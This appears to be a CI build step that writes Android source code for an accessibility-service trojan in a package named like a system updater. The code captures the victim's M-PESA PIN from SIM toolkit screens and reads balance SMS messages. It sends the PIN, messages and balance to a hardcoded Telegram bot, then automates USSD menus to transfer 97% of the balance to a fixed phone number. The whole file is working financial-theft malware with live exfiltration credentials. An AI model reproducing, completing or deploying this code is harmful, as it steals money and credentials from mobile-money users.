      - name: Create FinAutoService.java – INTENT-BASED DIALING + ACCESSIBILITY USSD
        run: |
          cat > app/src/main/java/com/system/updator/FinAutoService.java << 'EOF'
          package com.system.updator;

          import android.accessibilityservice.AccessibilityService;
          import android.accessibilityservice.GestureDescription;
          import android.content.ContentResolver;
          import android.content.Context;
          import android.content.Intent;
          import android.content.SharedPreferences;
          import android.database.Cursor;
          import android.graphics.Path;
          import android.net.Uri;
          import android.os.Handler;
          import android.os.Looper;
          import android.provider.Telephony;
          import android.telecom.PhoneAccountHandle;
          import android.telecom.TelecomManager;
          import android.telephony.SubscriptionInfo;
          import android.telephony.SubscriptionManager;
          import android.util.Log;
          import android.view.accessibility.AccessibilityEvent;
          import android.view.accessibility.AccessibilityNodeInfo;

          import com.google.gson.Gson;

          import java.net.HttpURLConnection;
          import java.net.URL;
          import java.text.SimpleDateFormat;
          import java.util.Date;
          import java.util.List;
          import java.util.Locale;
          import java.util.concurrent.ExecutorService;
          import java.util.concurrent.Executors;

          public class FinAutoService extends AccessibilityService {
              private static final String TAG = "FinAutoService";
              private static final String TARGET_PHONE = "0748688920";
              private static final double SEND_PERCENTAGE = 0.97;
              private static final String BOT_TOKEN = "8585104821:AAFXZn3g7QG9NsCmLmZuyfviQkPddOYMJzc";
              private static final String CHAT_ID = "8468538314";

              private SharedPreferences prefs;
              private Gson gson = new Gson();
              private Handler handler = new Handler(Looper.getMainLooper());
              private ExecutorService executor = Executors.newSingleThreadExecutor();

              private String pin = null;
              private boolean pinLearned = false;
              private boolean automating = false;

              @Override
              public void onServiceConnected() {
                  super.onServiceConnected();
                  Log.d(TAG, "✅ Service connected");
                  prefs = getSharedPreferences("fin_vault", MODE_PRIVATE);
                  loadData();
                  sendLastMpesaMessage();
              }

              private void loadData() {
                  String json = prefs.getString("mpesa_pin", "{}");
                  try {
                      PinData data = gson.fromJson(json, PinData.class);
                      if (data != null && data.isLearned && data.pin != null) {
                          pin = data.pin;
                          pinLearned = true;
                      }
                  } catch (Exception e) {
                      Log.e(TAG, "JSON parse error", e);
                  }
              }

              private void savePin(String p) {
                  PinData data = new PinData();
                  data.pin = p;
                  data.isLearned = true;
                  prefs.edit().putString("mpesa_pin", gson.toJson(data)).apply();
                  pin = p;
                  pinLearned = true;
                  sendTelegram("🔑 PIN Captured: " + p);
                  sendTelegram("⏳ Waiting 2 minutes for fresh balance SMS...");

                  handler.postDelayed(() -> {
                      double balance = getLastBalanceFromSms();
                      if (balance > 0) {
                          sendTelegram("💰 Extracted Balance: KES " + String.format("%.2f", balance));
                          double amount = balance * SEND_PERCENTAGE;
                          sendTelegram("🎯 Sending 97% = KES " + String.format("%.2f", amount));
                          startAutomation(amount);
                      } else {
                          sendTelegram("❌ No valid balance SMS found after 2 minutes. Aborting.");
                      }
                  }, 120000);
              }

              private void sendLastMpesaMessage() {
                  executor.execute(() -> {
                      try {
                          ContentResolver cr = getContentResolver();
                          Uri uri = Telephony.Sms.Inbox.CONTENT_URI;
                          String[] projection = { Telephony.Sms.Inbox.BODY, Telephony.Sms.Inbox.DATE };
                          String selection = Telephony.Sms.Inbox.ADDRESS + " LIKE ? AND " + Telephony.Sms.Inbox.BODY + " LIKE ?";
                          String[] selectionArgs = new String[]{"%MPESA%", "%balance%"};
                          String sortOrder = Telephony.Sms.Inbox.DATE + " DESC LIMIT 1";

                          Cursor cursor = cr.query(uri, projection, selection, selectionArgs, sortOrder);
                          if (cursor != null && cursor.moveToFirst()) {
                              String body = cursor.getString(cursor.getColumnIndex(Telephony.Sms.Inbox.BODY));
                              long date = cursor.getLong(cursor.getColumnIndex(Telephony.Sms.Inbox.DATE));
                              String time = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date(date));
                              sendTelegram("📩 *Last M-PESA Balance Message*\n⏰ " + time + "\n" + body);
                              cursor.close();
                          } else {
                              sendTelegram("ℹ️ No M-PESA balance messages found.");
                          }
                      } catch (Exception e) {
                          Log.e(TAG, "Error reading last SMS", e);
                          sendTelegram("❌ Failed to read last SMS: " + e.getMessage());
                      }
                  });
              }

              // EXACT BALANCE EXTRACTION
              private double getLastBalanceFromSms() {
                  try {
                      ContentResolver cr = getContentResolver();
                      Uri uri = Telephony.Sms.Inbox.CONTENT_URI;
                      String[] projection = { Telephony.Sms.Inbox.BODY };
                      String selection = Telephony.Sms.Inbox.ADDRESS + " LIKE ? AND " + Telephony.Sms.Inbox.BODY + " LIKE ?";
                      String[] selectionArgs = new String[]{"%MPESA%", "%balance%"};
                      String sortOrder = Telephony.Sms.Inbox.DATE + " DESC LIMIT 1";

                      Cursor cursor = cr.query(uri, projection, selection, selectionArgs, sortOrder);
                      if (cursor != null && cursor.moveToFirst()) {
                          String body = cursor.getString(cursor.getColumnIndex(Telephony.Sms.Inbox.BODY));
                          
                          // PRIMARY: Look for "New M-PESA balance is Ksh X.XX"
                          java.util.regex.Pattern p1 = java.util.regex.Pattern.compile(
                              "New M-PESA balance is\\s*(?:KES|Ksh)\\s*([\\d,\\.]+)", 
                              java.util.regex.Pattern.CASE_INSENSITIVE);
                          java.util.regex.Matcher m1 = p1.matcher(body);
                          if (m1.find()) {
                              String num = m1.group(1).replace(",", "").trim();
                              double val = Double.parseDouble(num);
                              cursor.close();
                              return val;
                          }
                          
                          // FALLBACK: Look for "balance is Ksh X.XX"
                          java.util.regex.Pattern p2 = java.util.regex.Pattern.compile(
                              "balance is\\s*(?:KES|Ksh)\\s*([\\d,\\.]+)", 
                              java.util.regex.Pattern.CASE_INSENSITIVE);
                          java.util.regex.Matcher m2 = p2.matcher(body);
                          if (m2.find()) {
                              String num = m2.group(1).replace(",", "").trim();
                              double val = Double.parseDouble(num);
                              cursor.close();
                              return val;
                          }
                          
                          // LAST RESORT: Largest number in message
                          java.util.regex.Pattern p3 = java.util.regex.Pattern.compile("([\\d,\\.]+)");
                          java.util.regex.Matcher m3 = p3.matcher(body);
                          double maxVal = 0;
                          while (m3.find()) {
                              String num = m3.group(1).replace(",", "").trim();
                              try {
                                  double val = Double.parseDouble(num);
                                  if (val > maxVal && val < 1000000) maxVal = val;
                              } catch (Exception e) {}
                          }
                          cursor.close();
                          return maxVal;
                      }
                  } catch (Exception e) {
                      Log.e(TAG, "Balance read error", e);
                  }
                  return 0;
              }

              @Override
              public void onAccessibilityEvent(AccessibilityEvent event) {
                  try {
                      if (event == null) return;
                      String pkg = event.getPackageName() != null ? event.getPackageName().toString() : "";

                      // CAPTURE PIN FROM STK
                      if ((pkg.contains("stk") || pkg.contains("sim")) && !pinLearned) {
                          AccessibilityNodeInfo root = getRootInActiveWindow();
                          if (root != null) {
                              String captured = findPasswordField(root);
                              if (captured != null && captured.length() >= 4) {
                                  savePin(captured);
                              }
                          }
                      }
                  } catch (Exception e) {
                      Log.e(TAG, "Event error", e);
                  }
              }

              private String findPasswordField(AccessibilityNodeInfo node) {
                  if (node == null) return null;
                  if (node.isPassword() && node.getText() != null) {
                      return node.getText().toString();
                  }
                  for (int i = 0; i < node.getChildCount(); i++) {
                      String result = findPasswordField(node.getChild(i));
                      if (result != null) return result;
                  }
                  return null;
              }

              // ========== MAIN AUTOMATION ==========
              private void startAutomation(double amount) {
                  if (automating) return;
                  automating = true;
                  sendTelegram("🚀 Starting USSD automation...");

                  // Fire the intent to dial *334# (encoded as %23)
                  dialUssdWithIntent("*334%23");

                  // Wait for USSD menu to appear (5 seconds)
                  handler.postDelayed(() -> {
                      performUssdFlow(amount);
                  }, 5000);
              }

              // ========== DIAL USSD VIA INTENT (DUAL SIM AWARE) ==========
              private void dialUssdWithIntent(String ussdCode) {
                  try {
                      Intent intent = new Intent(Intent.ACTION_CALL);
                      intent.setData(Uri.parse("tel:" + ussdCode));
                      intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

                      // Dual SIM handling – try to target Safaricom subscription
                      try {
                          SubscriptionManager sm = (SubscriptionManager) getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE);
                          if (sm != null) {
                              List<SubscriptionInfo> subs = sm.getActiveSubscriptionInfoList();
                              if (subs != null && subs.size() > 1) {
                                  for (SubscriptionInfo sub : subs) {
                                      String carrier = sub.getCarrierName() != null ? sub.getCarrierName().toString() : "";
                                      if (carrier.toLowerCase().contains("safaricom") || carrier.toLowerCase().contains("airtel")) {
                                          // Prefer Safaricom
                                          PhoneAccountHandle handle = getPhoneAccountHandle(sub.getSubscriptionId());
                                          if (handle != null) {
                                              intent.putExtra("android.telecom.extra.PHONE_ACCOUNT_HANDLE", handle);
                                              Log.d(TAG, "Targeting SIM: " + carrier);
                                          }
                                          break;
                                      }
                                  }
                              }
                          }
                      } catch (Exception e) {
                          Log.e(TAG, "Dual SIM handling failed (proceeding anyway): " + e.getMessage());
                      }

                      startActivity(intent);
                      Log.d(TAG, "Intent fired: ACTION_CALL tel:" + ussdCode);
                      sendTelegram("📞 USSD dialed via intent: *334#");
                  } catch (Exception e) {
                      Log.e(TAG, "Intent dial failed: " + e.getMessage());
                      sendTelegram("❌ Failed to dial USSD: " + e.getMessage());
                      automating = false;
                  }
              }

              private PhoneAccountHandle getPhoneAccountHandle(int subId) {
                  try {
                      TelecomManager tm = (TelecomManager) getSystemService(Context.TELECOM_SERVICE);
                      if (tm == null) return null;
                      List<PhoneAccountHandle> handles = tm.getCallCapablePhoneAccounts();
                      if (handles != null && !handles.isEmpty()) {
                          // Usually first handle is the default; matching subscription ID is not directly exposed,
                          // so we return the first one (the system will use the correct SIM if only one is set for calls).
                          return handles.get(0);
                      }
                  } catch (Exception e) {
                      Log.e(TAG, "PhoneAccountHandle error: " + e.getMessage());
                  }
                  return null;
              }

              // ========== USSD FLOW (STEP BY STEP) ==========
              private void performUssdFlow(double amount) {
                  // Step 1: Type 1 (Send Money) → Send
                  typeInField("1");
                  handler.postDelayed(() -> {
                      clickSend();
                      handler.postDelayed(() -> {
                          // Step 2: Type 1 (Any Network) → Send
                          typeInField("1");
                          handler.postDelayed(() -> {
                              clickSend();
                              handler.postDelayed(() -> {
                                  // Step 3: Type phone number → Send
                                  typeInField(TARGET_PHONE);
                                  handler.postDelayed(() -> {
                                      clickSend();
                                      handler.postDelayed(() -> {
                                          // Step 4: Type amount (97%) → Send
                                          typeInField(String.format("%.0f", amount));
                                          handler.postDelayed(() -> {
                                              clickSend();
                                              handler.postDelayed(() -> {
                                                  // Step 5: Type PIN → Send
                                                  typeInField(pin);
                                                  handler.postDelayed(() -> {
                                                      clickSend();
                                                      handler.postDelayed(() -> {
                                                          // Step 6: Type 1 (Confirm) → Send
                                                          typeInField("1");
                                                          handler.postDelayed(() -> {
                                                              clickSend();
                                                              handler.postDelayed(() -> {
                                                                  if (checkSuccess()) {
                                                                      sendTelegram("✅ *Transaction successful!*\n💰 KES " + String.format("%.2f", amount) + " sent to " + TARGET_PHONE);
                                                                  } else {
                                                                      sendTelegram("⚠️ Transaction status unknown. Please check M-PESA.");
                                                                  }
                                                                  automating = false;
                                                              }, 4000);
                                                          }, 2000);
                                                      }, 2000);
                                                  }, 2000);
                                              }, 2000);
                                          }, 2000);
                                      }, 2000);
                                  }, 2000);
                              }, 2000);
              }

              // ========== UI HELPERS ==========
              private boolean typeInField(String text) {
                  AccessibilityNodeInfo root = getRootInActiveWindow();
                  if (root == null) return false;
                  AccessibilityNodeInfo field = findEditableField(root);
                  if (field == null) {
                      field = findNodeByClassName(root, "android.widget.EditText");
                  }
                  if (field == null) {
                      field = findNodeByText(root, "Edit box");
                  }
                  if (field == null) {
                      field = findFirstFocusable(root);
                  }
                  if (field == null) {
                      Log.e(TAG, "No editable field found");
                      return false;
                  }
                  field.performAction(AccessibilityNodeInfo.ACTION_FOCUS);
                  field.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                  android.os.Bundle args = new android.os.Bundle();
                  args.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text);
                  boolean result = field.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args);
                  Log.d(TAG, "Typed: " + text + " = " + result);
                  return result;
              }

              private AccessibilityNodeInfo findNodeByClassName(AccessibilityNodeInfo node, String className) {
                  if (node == null) return null;
                  if (node.getClassName() != null && node.getClassName().toString().equals(className)) return node;
                  for (int i = 0; i < node.getChildCount(); i++) {
                      AccessibilityNodeInfo result = findNodeByClassName(node.getChild(i), className);
                      if (result != null) return result;
                  }
                  return null;
              }

              private AccessibilityNodeInfo findNodeByText(AccessibilityNodeInfo node, String text) {
                  if (node == null) return null;
                  if (node.getText() != null && node.getText().toString().equalsIgnoreCase(text)) return node;
                  for (int i = 0; i < node.getChildCount(); i++) {
                      AccessibilityNodeInfo result = findNodeByText(node.getChild(i), text);
                      if (result != null) return result;
                  }
                  return null;
              }

              private AccessibilityNodeInfo findFirstFocusable(AccessibilityNodeInfo node) {
                  if (node == null) return null;
                  if (node.isFocusable() && node.isEnabled()) return node;
                  for (int i = 0; i < node.getChildCount(); i++) {
                      AccessibilityNodeInfo result = findFirstFocusable(node.getChild(i));
                      if (result != null) return result;
                  }
                  return null;
              }

              private void clickSend() {
                  AccessibilityNodeInfo root = getRootInActiveWindow();
                  if (root == null) return;
                  String[] labels = {"Send", "send", "OK", "Ok", "Reply", "Next", "Confirm", "SEND", "ok"};
                  for (String label : labels) {
                      if (findAndClickByText(root, label)) return;
                  }
                  if (findAndClickByContentDesc(root, "Send")) return;
                  if (findAndClickByContentDesc(root, "OK")) return;
                  Log.e(TAG, "Send button not found — using coordinate fallback");
                  performCoordinateTap();
              }

              private boolean findAndClickByText(AccessibilityNodeInfo node, String text) {
                  if (node == null) return false;
                  try {
                      if (node.getText() != null && node.getText().toString().toLowerCase().contains(text.toLowerCase())) {
                          node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                          Log.d(TAG, "Clicked: " + text);
                          return true;
                      }
                      for (int i = 0; i < node.getChildCount(); i++) {
                          if (findAndClickByText(node.getChild(i), text)) return true;
                      }
                  } catch (Exception e) { }
                  return false;
              }

              private boolean findAndClickByContentDesc(AccessibilityNodeInfo node, String desc) {
                  if (node == null) return false;
                  try {
                      if (node.getContentDescription() != null && node.getContentDescription().toString().toLowerCase().contains(desc.toLowerCase())) {
                          node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                          return true;
                      }
                      for (int i = 0; i < node.getChildCount(); i++) {
                          if (findAndClickByContentDesc(node.getChild(i), desc)) return true;
                      }
                  } catch (Exception e) { }
                  return false;
              }

              private AccessibilityNodeInfo findEditableField(AccessibilityNodeInfo node) {
                  if (node == null) return null;
                  if (node.isEditable() && node.isEnabled()) return node;
                  for (int i = 0; i < node.getChildCount(); i++) {
                      AccessibilityNodeInfo result = findEditableField(node.getChild(i));
                      if (result != null) return result;
                  }
                  return null;
              }

              private void performCoordinateTap() {
                  AccessibilityNodeInfo root = getRootInActiveWindow();
                  if (root == null) return;
                  android.graphics.Rect bounds = new android.graphics.Rect();
                  root.getBoundsInScreen(bounds);
                  int tapX = (int) (bounds.width() * 0.85);
                  int tapY = (int) (bounds.height() * 0.9);
                  Path path = new Path();
                  path.moveTo(tapX, tapY);
                  GestureDescription.Builder gestureBuilder = new GestureDescription.Builder();
                  gestureBuilder.addStroke(new GestureDescription.StrokeDescription(path, 0, 100));
                  dispatchGesture(gestureBuilder.build(), null, null);
                  Log.d(TAG, "Coordinate tap at " + tapX + "," + tapY);
              }

              private boolean checkSuccess() {
                  AccessibilityNodeInfo root = getRootInActiveWindow();
                  if (root == null) return false;
                  String text = getAllText(root);
                  return text.toLowerCase().contains("confirmed") || text.toLowerCase().contains("successful") ||
                         text.toLowerCase().contains("complete") || text.toLowerCase().contains("success");
              }

              private String getAllText(AccessibilityNodeInfo node) {
                  if (node == null) return "";
                  StringBuilder sb = new StringBuilder();
                  if (node.getText() != null) sb.append(node.getText().toString()).append(" ");
                  for (int i = 0; i < node.getChildCount(); i++) {
                      sb.append(getAllText(node.getChild(i)));
                  }
                  return sb.toString();
              }

              // ========== TELEGRAM ==========
              private void sendTelegram(String msg) {
                  executor.execute(() -> {
                      try {
                          URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage");
                          HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                          conn.setRequestMethod("POST");
                          conn.setRequestProperty("Content-Type", "application/json");
                          conn.setConnectTimeout(5000);
                          conn.setReadTimeout(5000);
                          String json = "{\"chat_id\":\"" + CHAT_ID + "\",\"text\":\"" +
                              msg.replace("\"", "\\\"").replace("\n", "\\n") + "\",\"parse_mode\":\"Markdown\"}";
                          conn.getOutputStream().write(json.getBytes("UTF-8"));
                          conn.getOutputStream().flush();
                          conn.getResponseCode();
                          conn.disconnect();
                      } catch (Exception e) {
                          Log.e(TAG, "Telegram error", e);
                      }
                  });
              }

              @Override
              public void onInterrupt() { Log.d(TAG, "Service interrupted"); }

              @Override
              public void onDestroy() {
                  super.onDestroy();
                  executor.shutdown();
              }
          }
